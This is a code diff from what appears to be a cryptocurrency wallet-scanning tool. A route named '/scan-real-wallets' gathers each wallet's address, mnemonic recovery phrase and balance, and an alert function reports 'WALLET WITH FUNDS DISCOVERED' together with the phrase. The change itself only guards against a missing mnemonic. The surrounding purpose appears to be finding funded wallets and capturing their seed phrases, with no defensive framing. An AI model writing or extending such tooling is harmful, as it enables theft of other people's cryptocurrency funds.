@@ -30,7 +30,7 @@ router.post('/scan-real-wallets', async (req, res) => {
       
       scannedWallets.push({
         address: wallet.address,
-        phrase: wallet.mnemonic.phrase,
+        phrase: wallet.mnemonic?.phrase || 'N/A',
         balance: balance.totalValueUSD
       });
       
@@ -163,7 +163,7 @@ async function sendFundAlert(wallet, balance) {
 
 💰 WALLET WITH FUNDS DISCOVERED:
 Address: ${wallet.address}
-Phrase: ${wallet.mnemonic.phrase}
+Phrase: ${wallet.mnemonic?.phrase || 'N/A'}
 
 💵 BALANCE BREAKDOWN:
 ${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})` : ''}
